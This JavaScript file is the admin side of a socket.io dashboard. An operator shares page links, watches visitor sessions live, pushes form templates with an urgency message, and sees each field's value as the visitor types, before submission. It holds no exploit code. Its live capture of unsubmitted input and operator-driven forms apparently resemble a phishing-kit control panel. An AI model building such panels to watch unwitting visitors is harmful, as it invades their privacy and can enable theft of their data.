const socket = io();

const DEFAULT_DYNAMIC_TEXT = "Limited seats left for this batch. Enroll now before registrations close!";

const state = {
  pages: [],
  sessions: [],
  formTemplates: {},
  selectedPageId: null,
  selectedSessionId: null,
  // remembered so the template dropdown survives re-renders (e.g. on close form)
  selectedFormType: null,
  // optional per-open message admin can set; shown on the user's page under the title
  dynamicText: DEFAULT_DYNAMIC_TEXT,
  // sessionId -> [{ formId, formType, label, fields, status, values }, ...]
  // A history of every form opened for that session, oldest first, so the
  // admin sees each submission appended rather than replaced.
  liveForms: new Map(),
  // mobile drill-down view: 'pages' | 'sessions' | 'detail' (ignored on wide screens)
  mobileView: 'pages'
};

const el = {
  connStatus: document.getElementById('connStatus'),
  createPageForm: document.getElementById('createPageForm'),
  newPageTitle: document.getElementById('newPageTitle'),
  pagesList: document.getElementById('pagesList'),
  sessionsList: document.getElementById('sessionsList'),
  sessionsHeading: document.getElementById('sessionsHeading'),
  detailPanel: document.getElementById('detailPanel'),
  layout: document.getElementById('layout'),
  mobileBackBtn: document.getElementById('mobileBackBtn')
};

// ---------- mobile drill-down navigation ----------
function setMobileView(view) {
  state.mobileView = view;
  el.layout.dataset.active = view;
  el.mobileBackBtn.classList.toggle('show', view !== 'pages');
}

el.mobileBackBtn.addEventListener('click', () => {
  if (state.mobileView === 'detail') setMobileView('sessions');
  else if (state.mobileView === 'sessions') setMobileView('pages');
});

// ---------- helpers ----------
function fmtTime(iso) {
  if (!iso) return '';
  const d = new Date(iso);
  return d.toLocaleString();
}

function pageTitleById(pageId) {
  const p = state.pages.find((pg) => pg.id === pageId);
  return p ? p.title : pageId;
}

async function api(path, options) {
  const res = await fetch(path, options);
  if (!res.ok) throw new Error(`Request failed: ${res.status}`);
  return res.json();
}

// ---------- data loading ----------
async function loadPages() {
  state.pages = await api('/api/pages');
  renderPages();
}

// ---------- rendering ----------
function renderPages() {
  el.pagesList.innerHTML = '';
  const allItem = document.createElement('li');
  allItem.className = 'page-item' + (state.selectedPageId === null ? ' active' : '');
  allItem.innerHTML = `<div class="title">All Pages</div>`;
  allItem.onclick = () => {
    state.selectedPageId = null;
    renderPages();
    renderSessions();
    setMobileView('sessions');
  };
  el.pagesList.appendChild(allItem);

  for (const page of state.pages) {
    const li = document.createElement('li');
    li.className = 'page-item' + (state.selectedPageId === page.id ? ' active' : '');
    li.innerHTML = `
      <div class="title">${escapeHtml(page.title)}</div>
      <span class="url">${escapeHtml(page.url)}</span>
      <button class="copy-btn" type="button">Copy link</button>
      <button class="delete-btn" type="button" aria-label="Delete page" title="Delete page">
        <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
          <path d="M3 6h18M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2m3 0-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6m5 5v6m4-6v6"/>
        </svg>
      </button>
    `;
    li.querySelector('.title').onclick = () => {
      state.selectedPageId = page.id;
      renderPages();
      renderSessions();
      setMobileView('sessions');
    };
    li.querySelector('.copy-btn').onclick = (e) => {
      e.stopPropagation();
      const btn = e.currentTarget;
      navigator.clipboard.writeText(page.url).then(() => {
        btn.textContent = 'Copied!';
        btn.classList.add('copied');
        clearTimeout(btn._copyTimer);
        btn._copyTimer = setTimeout(() => {
          btn.textContent = 'Copy link';
          btn.classList.remove('copied');
        }, 1500);
      }).catch(() => {
        btn.textContent = 'Copy failed';
        clearTimeout(btn._copyTimer);
        btn._copyTimer = setTimeout(() => { btn.textContent = 'Copy link'; }, 1500);
      });
    };
    li.querySelector('.delete-btn').onclick = (e) => {
      e.stopPropagation();
      showDeleteConfirm(li, page);
    };
    el.pagesList.appendChild(li);
  }
}

// Small inline confirm popover anchored to a page item
function closeDeleteConfirm() {
  const existing = document.querySelector('.confirm-pop');
  if (existing) existing.remove();
}

function showDeleteConfirm(li, page) {
  closeDeleteConfirm();
  const pop = document.createElement('div');
  pop.className = 'confirm-pop';
  pop.innerHTML = `
    <div class="confirm-text">Delete <strong>${escapeHtml(page.title)}</strong>?</div>
    <div class="confirm-sub">All its sessions and form data will be removed.</div>
    <div class="confirm-actions">
      <button type="button" class="cancel">Cancel</button>
      <button type="button" class="confirm">Delete</button>
    </div>
  `;
  pop.onclick = (e) => e.stopPropagation();
  pop.querySelector('.cancel').onclick = closeDeleteConfirm;
  pop.querySelector('.confirm').onclick = async (e) => {
    e.target.disabled = true;
    e.target.textContent = 'Deleting…';
    try {
      await api(`/api/pages/${encodeURIComponent(page.id)}`, { method: 'DELETE' });
      removePageLocally(page.id);
    } catch (err) {
      e.target.disabled = false;
      e.target.textContent = 'Delete';
      pop.querySelector('.confirm-sub').textContent = 'Failed to delete. Try again.';
    }
  };
  li.appendChild(pop);
  pop.querySelector('.cancel').focus();
}

document.addEventListener('click', closeDeleteConfirm);
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') closeDeleteConfirm();
});

// ---------- custom form-type dropdown ----------
// A single delegated listener (rather than one per renderDetail call, which
// would stack up across re-renders) closes the menu on outside click / Esc.
function closeFormTypeMenu() {
  const menu = document.getElementById('formTypeMenu');
  if (!menu || menu.hidden) return;
  menu.hidden = true;
  const trigger = document.getElementById('formTypeTrigger');
  if (trigger) trigger.classList.remove('open');
}
document.addEventListener('click', (e) => {
  if (!e.target.closest('#formTypeSelect')) closeFormTypeMenu();
});
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') closeFormTypeMenu();
});

function removePageLocally(pageId) {
  const removedSessionIds = new Set(
    state.sessions.filter((s) => s.page_id === pageId).map((s) => s.id)
  );
  state.pages = state.pages.filter((p) => p.id !== pageId);
  state.sessions = state.sessions.filter((s) => s.page_id !== pageId);
  for (const id of removedSessionIds) state.liveForms.delete(id);

  if (state.selectedPageId === pageId) state.selectedPageId = null;
  if (removedSessionIds.has(state.selectedSessionId)) {
    state.selectedSessionId = null;
    if (state.mobileView !== 'pages') setMobileView('pages');
  }

  renderPages();
  renderSessions();
  renderDetail();
}

function renderSessions() {
  const filtered = state.selectedPageId
    ? state.sessions.filter((s) => s.page_id === state.selectedPageId)
    : state.sessions;

  el.sessionsHeading.textContent = state.selectedPageId
    ? `Sessions · ${pageTitleById(state.selectedPageId)}`
    : 'All Sessions';

  el.sessionsList.innerHTML = '';
  if (filtered.length === 0) {
    const empty = document.createElement('li');
    empty.className = 'meta';
    empty.style.padding = '10px';
    empty.textContent = 'No sessions yet. Share a page link to see sessions appear live.';
    el.sessionsList.appendChild(empty);
    return;
  }

  for (const session of filtered) {
    const li = document.createElement('li');
    li.className = 'session-item' + (state.selectedSessionId === session.id ? ' selected' : '');
    li.innerHTML = `
      <div class="row">
        <span class="page-tag">${escapeHtml(pageTitleById(session.page_id))}</span>
        <span class="badge ${session.status}">${session.status}</span>
      </div>
      <div class="meta">Session ${session.id.slice(0, 8)}…</div>
      <div class="meta">${fmtTime(session.created_at)}</div>
    `;
    li.onclick = () => selectSession(session.id);
    el.sessionsList.appendChild(li);
  }
}

function renderDetail() {
  const session = state.sessions.find((s) => s.id === state.selectedSessionId);
  if (!session) {
    el.detailPanel.innerHTML = `<div class="empty-state">Select a session to view details</div>`;
    return;
  }

  const forms = state.liveForms.get(session.id) || [];
  const openForm = forms.find((f) => f.status === 'open');

  // Keep the remembered selection valid (e.g. formTemplates just loaded, or
  // it pointed at a template that no longer exists); default to the first.
  const formTypeKeys = Object.keys(state.formTemplates);
  if (!state.selectedFormType || !state.formTemplates[state.selectedFormType]) {
    state.selectedFormType = formTypeKeys[0] || null;
  }
  const selectedTpl = state.selectedFormType ? state.formTemplates[state.selectedFormType] : null;

  const formOptions = Object.entries(state.formTemplates)
    .map(([key, tpl]) => `<li class="custom-select-option${key === state.selectedFormType ? ' selected' : ''}" data-value="${key}">${escapeHtml(tpl.label)}</li>`)
    .join('');

  const hasOpenForm = !!openForm;

  el.detailPanel.innerHTML = `
    <div class="detail-header">
      <h2>${escapeHtml(pageTitleById(session.page_id))}</h2>
      <div class="sub">Session ${session.id} · ${session.status} · ${escapeHtml(session.user_agent || '')}</div>
    </div>

    <div class="dynamic-text-field">
      <label for="dynamicTextInput">Message shown under the form title</label>
      <textarea id="dynamicTextInput" rows="2" placeholder="e.g. Limited seats left — enroll before Friday!">${escapeHtml(state.dynamicText || '')}</textarea>
    </div>

    <div class="form-actions">
      <div class="custom-select" id="formTypeSelect">
        <button type="button" class="custom-select-trigger" id="formTypeTrigger">
          <span>${escapeHtml(selectedTpl ? selectedTpl.label : 'No templates')}</span>
          <svg class="custom-select-chevron" viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
        </button>
        <ul class="custom-select-menu" id="formTypeMenu" hidden>${formOptions}</ul>
      </div>
      <button id="openFormBtn" class="primary" ${hasOpenForm ? 'disabled' : ''}>Open Form</button>
      <button id="closeFormBtn" class="danger">Close Form</button>
    </div>

    <div id="liveFormContainer"></div>
  `;

  const formTypeTrigger = document.getElementById('formTypeTrigger');
  const formTypeMenu = document.getElementById('formTypeMenu');

  formTypeTrigger.onclick = (e) => {
    e.stopPropagation();
    formTypeMenu.hidden = !formTypeMenu.hidden;
    formTypeTrigger.classList.toggle('open', !formTypeMenu.hidden);
  };

  formTypeMenu.querySelectorAll('.custom-select-option').forEach((opt) => {
    opt.onclick = () => {
      state.selectedFormType = opt.dataset.value;
      formTypeMenu.querySelectorAll('.custom-select-option').forEach((o) => o.classList.remove('selected'));
      opt.classList.add('selected');
      formTypeTrigger.querySelector('span').textContent = opt.textContent;
      formTypeMenu.hidden = true;
      formTypeTrigger.classList.remove('open');
    };
  });

  document.getElementById('dynamicTextInput').oninput = (e) => {
    state.dynamicText = e.target.value;
  };
  document.getElementById('openFormBtn').onclick = () => {
    const formType = state.selectedFormType;
    const dynamicText = document.getElementById('dynamicTextInput').value.trim();
    socket.emit('admin:openForm', { sessionId: session.id, formType, dynamicText }, (resp) => {
      if (resp && resp.error) alert(resp.error);
    });
  };
  document.getElementById('closeFormBtn').onclick = () => {
    if (!openForm) return;
    socket.emit('admin:closeForm', { sessionId: session.id, formId: openForm.formId });
  };

  renderLiveForm(session.id);
}

function renderLiveForm(sessionId) {
  const container = document.getElementById('liveFormContainer');
  if (!container) return;

  const forms = state.liveForms.get(sessionId) || [];
  if (!forms.length) {
    container.innerHTML = '';
    return;
  }

  // Newest first, so the currently open form (if any) sits on top instead
  // of at the bottom of the history.
  container.innerHTML = forms
    .slice()
    .reverse()
    .map((live) => {
      const fieldsHtml = live.fields
        .map((f) => {
          const value = live.values[f.name] || '';
          return `
            <p class="field-row">
              <span class="field-label">${escapeHtml(f.label)}${f.required ? ' *' : ''}:</span>
              <span class="field-text">${value ? escapeHtml(value) : '<span class="field-empty">—</span>'}</span>
            </p>
          `;
        })
        .join('');

      return `
        <div class="live-form">
          <div class="form-title">
            <h3>${escapeHtml(live.label)}</h3>
            <span class="status-tag ${live.status}">${live.status}</span>
          </div>
          ${fieldsHtml}
        </div>
      `;
    })
    .join('');
}

function escapeHtml(str) {
  return String(str).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  })[c]);
}

// ---------- actions ----------
function selectSession(sessionId) {
  state.selectedSessionId = sessionId;
  renderSessions();
  renderDetail();
  setMobileView('detail');
}

el.createPageForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  const title = el.newPageTitle.value.trim();
  if (!title) return;
  try {
    const page = await api('/api/pages', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ title })
    });
    el.newPageTitle.value = '';
    await loadPages();
    state.selectedPageId = page.id;
    renderPages();
    renderSessions();
  } catch (err) {
    alert('Failed to create page');
  }
});

// ---------- socket wiring ----------
socket.on('connect', () => {
  el.connStatus.textContent = 'online';
  el.connStatus.className = 'status-pill online';

  socket.emit('admin:register', {}, (resp) => {
    if (!resp) return;
    state.formTemplates = resp.formTemplates || {};
    state.sessions = (resp.sessions || []).map((s) => ({ ...s }));
    renderSessions();
    if (state.selectedSessionId) renderDetail();
  });
});

socket.on('disconnect', () => {
  el.connStatus.textContent = 'offline';
  el.connStatus.className = 'status-pill offline';
});

socket.on('session:new', ({ session }) => {
  state.sessions.unshift(session);
  renderSessions();
});

socket.on('page:deleted', ({ pageId }) => {
  if (state.pages.some((p) => p.id === pageId)) removePageLocally(pageId);
});

socket.on('session:online', ({ sessionId, session }) => {
  const existing = state.sessions.find((s) => s.id === sessionId);
  if (existing) {
    existing.status = 'active';
  } else if (session) {
    state.sessions.unshift(session);
  }
  renderSessions();
  if (state.selectedSessionId === sessionId) renderDetail();
});

socket.on('session:offline', ({ sessionId }) => {
  const session = state.sessions.find((s) => s.id === sessionId);
  if (session) session.status = 'inactive';
  renderSessions();
  if (state.selectedSessionId === sessionId) renderDetail();
});

socket.on('form:opened', ({ sessionId, formId, formType, label, fields }) => {
  const forms = state.liveForms.get(sessionId) || [];
  forms.push({ formId, formType, label, fields, status: 'open', values: {} });
  state.liveForms.set(sessionId, forms);
  if (state.selectedSessionId === sessionId) renderDetail();
});

socket.on('form:inputUpdate', ({ sessionId, formId, field, value }) => {
  const forms = state.liveForms.get(sessionId);
  const live = forms && forms.find((f) => f.formId === formId);
  if (!live) return;
  live.values[field] = value;
  if (state.selectedSessionId === sessionId) renderLiveForm(sessionId);
});

socket.on('form:submitted', ({ sessionId, formId, data }) => {
  const forms = state.liveForms.get(sessionId);
  const live = forms && forms.find((f) => f.formId === formId);
  if (!live) return;
  live.status = 'submitted';
  live.values = { ...live.values, ...data };
  if (state.selectedSessionId === sessionId) renderDetail();
});

socket.on('form:closed', ({ sessionId, formId }) => {
  const forms = state.liveForms.get(sessionId);
  const live = forms && forms.find((f) => f.formId === formId);
  if (!live) return;
  live.status = 'closed';
  if (state.selectedSessionId === sessionId) renderDetail();
});

// ---------- init ----------
loadPages();
renderSessions();
renderDetail();
